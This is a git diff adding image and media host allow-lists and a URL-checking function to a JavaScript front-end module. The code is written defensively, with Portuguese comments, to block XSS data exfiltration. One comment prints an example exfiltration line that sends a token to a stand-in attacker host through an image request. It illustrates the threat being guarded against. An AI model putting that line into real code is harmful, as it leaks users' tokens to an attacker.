@@ -183,3 +183,31 @@ export function imprimirQuandoPronto(win) {
   if (win.document.readyState === 'complete') disparar()
   else win.addEventListener('load', disparar)
 }
+
+// ── Hosts permitidos para imagem e vídeo direto ──────────────────────────────
+// MANTENHA IGUAL ao img-src / media-src da CSP no index.html (ferramentas/verifica-csp.mjs confere).
+// Por que lista e não "qualquer https:": uma URL de imagem em um XSS é um canal para ENVIAR dados para fora
+// (new Image().src = 'https://atacante/?t=' + token). Com lista, só estes hosts recebem requisições.
+export const HOSTS_IMAGEM = ['i.imgur.com', '*.googleusercontent.com', 'kctgcjvfsuinwlbgljdw.supabase.co', 'tummee.com', '*.tummee.com']
+export const HOSTS_MIDIA  = ['i.imgur.com', 'kctgcjvfsuinwlbgljdw.supabase.co']
+const PIXEL_VAZIO = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='
+
+/** true se a URL for https e o host estiver na lista (suporta '*.dominio.com'); mesma origem também passa. */
+export function hostPermitido(url, lista) {
+  try {
+    const u = new URL(String(url), location.href)
+    if (u.origin === location.origin) return true
+    if (u.protocol !== 'https:') return false
+    return lista.some(h => h.startsWith('*.')
+      ? u.hostname.endsWith(h.slice(1)) && u.hostname !== h.slice(2)
+      : u.hostname === h)
+  } catch { return false }
+}
+
+/** URL para <img src>: segura (urlSegura) E de host permitido; senão, um pixel transparente (não faz requisição). */
+export function imagemSegura(url) {
+  const s = urlSegura(url)
+  if (!s || s === '#') return PIXEL_VAZIO
+  if (s.startsWith('data:') || hostPermitido(s, HOSTS_IMAGEM)) return s
+  return PIXEL_VAZIO
+}
